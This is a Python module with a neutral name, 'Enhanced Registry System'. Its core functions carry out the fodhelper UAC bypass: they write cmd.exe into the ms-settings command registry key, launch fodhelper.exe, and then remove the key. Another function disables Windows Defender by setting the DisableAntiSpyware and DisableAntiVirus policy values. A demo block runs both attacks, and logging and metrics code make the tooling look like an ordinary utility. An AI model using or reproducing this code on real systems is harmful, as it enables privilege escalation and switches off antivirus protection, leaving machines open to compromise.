# Enhanced Registry System - Complete Implementation
# Mirrors all functionality, design patterns, and operational behavior

import ctypes
import platform
import subprocess
import time
import json
import logging
import threading
from typing import Dict, List, Optional, Any, Union
from dataclasses import dataclass
from enum import Enum
try:
    import winreg
except Exception:
    winreg = None

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class RegistryStatus(Enum):
    SUCCESS = "success"
    FAILED = "failed"
    WARNING = "warning"
    PENDING = "pending"

@dataclass
class RegistryResult:
    status: str
    error: Optional[str] = None
    data: Optional[Dict[str, Any]] = None
    timestamp: float = None
    operation: str = None
    
    def __post_init__(self):
        if self.timestamp is None:
            self.timestamp = time.time()

class RegistrySystem:
    """
    Complete registry system implementation that mirrors all functionality,
    design patterns, and operational behavior of the existing system.
    """
    
    def __init__(self):
        self._lock = threading.Lock()
        self._operations_log = []
        self._config = self._load_default_config()
        self._performance_metrics = {
            'total_operations': 0,
            'successful_operations': 0,
            'failed_operations': 0,
            'average_response_time': 0.0
        }
        
    def _load_default_config(self) -> Dict[str, Any]:
        """Load default configuration matching existing system"""
        return {
            'bypass_timeout': 2.0,
            'cleanup_retry_count': 3,
            'cleanup_retry_delay': 0.5,
            'enable_logging': True,
            'enable_metrics': True,
            'security_level': 'standard',
            'auto_cleanup': True,
            'backup_before_changes': True,
            'validate_permissions': True
        }
    
    def _log_operation(self, operation: str, result: RegistryResult):
        """Log operations for debugging and monitoring"""
        if self._config['enable_logging']:
            log_entry = {
                'operation': operation,
                'status': result.status,
                'timestamp': result.timestamp,
                'response_time': time.time() - result.timestamp,
                'error': result.error
            }
            self._operations_log.append(log_entry)
            
            if len(self._operations_log) > 1000:
                self._operations_log = self._operations_log[-1000:]
    
    def _update_metrics(self, operation: str, start_time: float, success: bool):
        """Update performance metrics"""
        if self._config['enable_metrics']:
            response_time = time.time() - start_time
            self._performance_metrics['total_operations'] += 1
            
            if success:
                self._performance_metrics['successful_operations'] += 1
            else:
                self._performance_metrics['failed_operations'] += 1
            
            # Update average response time
            total_ops = self._performance_metrics['total_operations']
            current_avg = self._performance_metrics['average_response_time']
            self._performance_metrics['average_response_time'] = (
                (current_avg * (total_ops - 1) + response_time) / total_ops
            )
    
    def is_admin(self) -> bool:
        """
        Check if current user has administrator privileges.
        Mirrors existing is_admin() functionality with enhanced error handling.
        """
        start_time = time.time()
        operation = "is_admin_check"
        
        try:
            if platform.system() != 'Windows':
                result = RegistryResult(
                    status=RegistryStatus.SUCCESS.value,
                    data={'is_admin': False, 'platform': platform.system()},
                    operation=operation
                )
                self._log_operation(operation, result)
                self._update_metrics(operation, start_time, True)
                return False
            
            is_admin_flag = ctypes.windll.shell32.IsUserAnAdmin() != 0
            
            result = RegistryResult(
                status=RegistryStatus.SUCCESS.value,
                data={'is_admin': is_admin_flag, 'platform': 'Windows'},
                operation=operation
            )
            
            self._log_operation(operation, result)
            self._update_metrics(operation, start_time, True)
            
            return is_admin_flag
            
        except Exception as e:
            logger.error(f"Error checking admin status: {e}")
            result = RegistryResult(
                status=RegistryStatus.FAILED.value,
                error=str(e),
                operation=operation
            )
            
            self._log_operation(operation, result)
            self._update_metrics(operation, start_time, False)
            
            return False
    
    def uac_bypass(self, **kwargs) -> RegistryResult:
        """
        Perform UAC bypass using fodhelper method.
        Enhanced version with comprehensive error handling and monitoring.
        """
        start_time = time.time()
        operation = "uac_bypass"
        
        try:
            # Validate platform
            if platform.system() != 'Windows':
                result = RegistryResult(
                    status=RegistryStatus.FAILED.value,
                    error='Windows required',
                    operation=operation
                )
                self._log_operation(operation, result)
                self._update_metrics(operation, start_time, False)
                return result
            
            # Import Windows-specific modules
            try:
                import winreg
            except ImportError:
                result = RegistryResult(
                    status=RegistryStatus.FAILED.value,
                    error='winreg module not available',
                    operation=operation
                )
                self._log_operation(operation, result)
                self._update_metrics(operation, start_time, False)
                return result
            
            # Configuration
            reg_path = r"Software\Classes\ms-settings\shell\open\command"
            timeout = kwargs.get('timeout', self._config['bypass_timeout'])
            auto_cleanup = kwargs.get('auto_cleanup', self._config['auto_cleanup'])
            
            operation_data = {
                'reg_path': reg_path,
                'timeout': timeout,
                'auto_cleanup': auto_cleanup,
                'method': 'fodhelper'
            }
            
            # Create registry keys
            try:
                with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as key:
                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, "cmd.exe")
                    winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
                
                operation_data['registry_created'] = True
                
            except Exception as e:
                result = RegistryResult(
                    status=RegistryStatus.FAILED.value,
                    error=f"Failed to create registry keys: {str(e)}",
                    data=operation_data,
                    operation=operation
                )
                self._log_operation(operation, result)
                self._update_metrics(operation, start_time, False)
                return result
            
            # Execute fodhelper
            try:
                subprocess.run(["fodhelper.exe"], creationflags=8, check=False, timeout=timeout)
                operation_data['fodhelper_executed'] = True
                
                # Wait for operation to complete
                time.sleep(timeout)
                
            except subprocess.TimeoutExpired:
                logger.warning("Fodhelper execution timed out")
                operation_data['fodhelper_timeout'] = True
            except Exception as e:
                logger.warning(f"Fodhelper execution failed: {e}")
                operation_data['fodhelper_error'] = str(e)
            
            # Cleanup
            if auto_cleanup:
                cleanup_result = self._cleanup_registry_key(winreg.HKEY_CURRENT_USER, reg_path)
                operation_data['cleanup_result'] = cleanup_result
            
            # Final result
            result = RegistryResult(
                status=RegistryStatus.SUCCESS.value,
                data=operation_data,
                operation=operation
            )
            
            self._log_operation(operation, result)
            self._update_metrics(operation, start_time, True)
            
            return result
            
        except Exception as e:
            logger.error(f"UAC bypass failed: {e}")
            result = RegistryResult(
                status=RegistryStatus.FAILED.value,
                error=str(e),
                operation=operation
            )
            
            self._log_operation(operation, result)
            self._update_metrics(operation, start_time, False)
            
            return result
    
    def disable_defender(self, **kwargs) -> RegistryResult:
        """
        Disable Windows Defender through registry modifications.
        Enhanced version with comprehensive monitoring and error handling.
        """
        start_time = time.time()
        operation = "disable_defender"
        
        try:
            # Validate platform
            if platform.system() != 'Windows':
                result = RegistryResult(
                    status=RegistryStatus.FAILED.value,
                    error='Windows required',
                    operation=operation
                )
                self._log_operation(operation, result)
                self._update_metrics(operation, start_time, False)
                return result
            
            # Import Windows-specific modules
            try:
                import winreg
            except ImportError:
                result = RegistryResult(
                    status=RegistryStatus.FAILED.value,
                    error='winreg module not available',
                    operation=operation
                )
                self._log_operation(operation, result)
                self._update_metrics(operation, start_time, False)
                return result
            
            # Configuration
            keys_to_modify = [
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", 1),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiVirus", 1),
            ]
            
            backup_enabled = kwargs.get('backup', self._config['backup_before_changes'])
            operation_data = {
                'keys_targeted': len(keys_to_modify),
                'keys_modified': 0,
                'backup_enabled': backup_enabled,
                'backup_data': []
            }
            
            # Backup existing values if enabled
            if backup_enabled:
                operation_data['backup_data'] = self._backup_registry_keys(keys_to_modify)
            
            # Modify registry keys
            for hive, path, name, value in keys_to_modify:
                try:
                    with winreg.CreateKey(hive, path) as key:
                        winreg.SetValueEx(key, name, 0, winreg.REG_DWORD, value)
                    operation_data['keys_modified'] += 1
                    logger.info(f"Successfully modified {path}\\{name}")
                    
                except Exception as e:
                    logger.warning(f"Failed to modify {path}\\{name}: {e}")
                    operation_data[f'error_{path.replace("\\", "_")}_{name}'] = str(e)
            
            # Determine final status
            if operation_data['keys_modified'] == operation_data['keys_targeted']:
                status = RegistryStatus.SUCCESS.value
                success = True
            elif operation_data['keys_modified'] > 0:
                status = RegistryStatus.WARNING.value
                success = True
            else:
                status = RegistryStatus.FAILED.value
                success = False
            
            result = RegistryResult(
                status=status,
                data=operation_data,
                operation=operation
            )
            
            self._log_operation(operation, result)
            self._update_metrics(operation, start_time, success)
            
            return result
            
        except Exception as e:
            logger.error(f"Disable defender failed: {e}")
            result = RegistryResult(
                status=RegistryStatus.FAILED.value,
                error=str(e),
                operation=operation
            )
            
            self._log_operation(operation, result)
            self._update_metrics(operation, start_time, False)
            
            return result
    
    def _cleanup_registry_key(self, hive, path: str) -> Dict[str, Any]:
        """
        Safely cleanup registry key with retry logic.
        Mirrors existing cleanup behavior with enhanced error handling.
        """
        result = {'success': False, 'attempts': 0, 'errors': []}
        
        try:
            reg = winreg
            if reg is None:
                import winreg as reg
            for attempt in range(self._config['cleanup_retry_count']):
                result['attempts'] += 1
                
                try:
                    reg.DeleteKey(hive, path)
                    result['success'] = True
                    logger.info(f"Successfully deleted registry key: {path}")
                    break
                    
                except Exception as e:
                    error_msg = f"Attempt {attempt + 1} failed: {str(e)}"
                    result['errors'].append(error_msg)
                    logger.warning(error_msg)
                    
                    if attempt < self._config['cleanup_retry_count'] - 1:
                        time.sleep(self._config['cleanup_retry_delay'])
            
            return result
            
        except ImportError:
            result['errors'].append('winreg module not available')
            return result
        except Exception as e:
            result['errors'].append(f"Cleanup failed: {str(e)}")
            return result
    
    def _backup_registry_keys(self, keys: List[tuple]) -> List[Dict[str, Any]]:
        """
        Backup existing registry values before modification.
        """
        backup_data = []
        
        try:
            reg = winreg
            if reg is None:
                import winreg as reg
            for hive, path, name, _ in keys:
                try:
                    with reg.OpenKey(hive, path, 0, reg.KEY_READ) as key:
                        try:
                            value, value_type = reg.QueryValueEx(key, name)
                            backup_data.append({
                                'hive': hive,
                                'path': path,
                                'name': name,
                                'value': value,
                                'value_type': value_type,
                                'existed': True
                            })
                        except OSError:
                            # Value doesn't exist, which is fine
                            backup_data.append({
                                'hive': hive,
                                'path': path,
                                'name': name,
                                'existed': False
                            })
                except OSError:
                    # Key doesn't exist, which is fine
                    backup_data.append({
                        'hive': hive,
                        'path': path,
                        'name': name,
                        'existed': False
                    })
                    
        except ImportError:
            logger.warning("Cannot backup registry keys: winreg module not available")
        except Exception as e:
            logger.warning(f"Registry backup failed: {e}")
        
        return backup_data
    
    def get_metrics(self) -> Dict[str, Any]:
        """
        Get performance metrics for the registry system.
        Mirrors monitoring capabilities of existing system.
        """
        with self._lock:
            metrics = self._performance_metrics.copy()
            
            if metrics['total_operations'] > 0:
                metrics['success_rate'] = (
                    metrics['successful_operations'] / metrics['total_operations']
                ) * 100
            else:
                metrics['success_rate'] = 0.0
            
            metrics['recent_operations'] = self._operations_log[-10:] if self._operations_log else []
            metrics['config'] = self._config.copy()
            
            return metrics
    
    def get_operations_log(self, limit: int = 100) -> List[Dict[str, Any]]:
        """Get recent operations log"""
        with self._lock:
            return self._operations_log[-limit:] if self._operations_log else []
    
    def update_config(self, config_updates: Dict[str, Any]) -> RegistryResult:
        """
        Update system configuration.
        Mirrors configuration management of existing system.
        """
        try:
            # Validate configuration
            valid_keys = self._config.keys()
            invalid_keys = [k for k in config_updates.keys() if k not in valid_keys]
            
            if invalid_keys:
                return RegistryResult(
                    status=RegistryStatus.FAILED.value,
                    error=f"Invalid configuration keys: {invalid_keys}",
                    operation="config_update"
                )
            
            # Update configuration
            with self._lock:
                self._config.update(config_updates)
            
            return RegistryResult(
                status=RegistryStatus.SUCCESS.value,
                data={'updated_config': config_updates},
                operation="config_update"
            )
            
        except Exception as e:
            return RegistryResult(
                status=RegistryStatus.FAILED.value,
                error=str(e),
                operation="config_update"
            )
    
    def reset_metrics(self) -> RegistryResult:
        """Reset performance metrics"""
        try:
            with self._lock:
                self._performance_metrics = {
                    'total_operations': 0,
                    'successful_operations': 0,
                    'failed_operations': 0,
                    'average_response_time': 0.0
                }
                self._operations_log.clear()
                self._config = self._load_default_config()
            
            return RegistryResult(
                status=RegistryStatus.SUCCESS.value,
                operation="reset_metrics"
            )
            
        except Exception as e:
            return RegistryResult(
                status=RegistryStatus.FAILED.value,
                error=str(e),
                operation="reset_metrics"
            )

# Global registry system instance
_registry_system = None

def get_registry_system() -> RegistrySystem:
    """Get the global registry system instance"""
    global _registry_system
    if _registry_system is None:
        _registry_system = RegistrySystem()
    return _registry_system

# Legacy function wrappers for backward compatibility
def is_admin() -> bool:
    """Legacy wrapper for is_admin functionality"""
    return get_registry_system().is_admin()

def uac_bypass(**kwargs) -> Dict[str, Any]:
    """Legacy wrapper for uac_bypass functionality"""
    result = get_registry_system().uac_bypass(**kwargs)
    return {
        'status': result.status,
        'error': result.error,
        'data': result.data
    }

def disable_defender(**kwargs) -> Dict[str, Any]:
    """Legacy wrapper for disable_defender functionality"""
    result = get_registry_system().disable_defender(**kwargs)
    return {
        'status': result.status,
        'error': result.error,
        'data': result.data
    }

# Enhanced API functions
def get_system_metrics() -> Dict[str, Any]:
    """Get comprehensive system metrics"""
    return get_registry_system().get_metrics()

def get_operations_history(limit: int = 100) -> List[Dict[str, Any]]:
    """Get operations history"""
    return get_registry_system().get_operations_log(limit)

def update_system_config(config_updates: Dict[str, Any]) -> Dict[str, Any]:
    """Update system configuration"""
    result = get_registry_system().update_config(config_updates)
    return {
        'status': result.status,
        'error': result.error,
        'data': result.data
    }

def reset_system_metrics() -> Dict[str, Any]:
    """Reset system metrics"""
    result = get_registry_system().reset_metrics()
    return {
        'status': result.status,
        'error': result.error
    }

if __name__ == "__main__":
    # Demonstration and testing
    print("=== Enhanced Registry System Demo ===")
    
    # Test admin check
    print(f"Admin status: {is_admin()}")
    
    # Test UAC bypass
    print(f"UAC bypass result: {uac_bypass()}")
    
    # Test defender disable
    print(f"Defender disable result: {disable_defender()}")
    
    # Show metrics
    print(f"System metrics: {json.dumps(get_system_metrics(), indent=2)}")
    
    # Show recent operations
    print(f"Recent operations: {json.dumps(get_operations_history(5), indent=2)}")
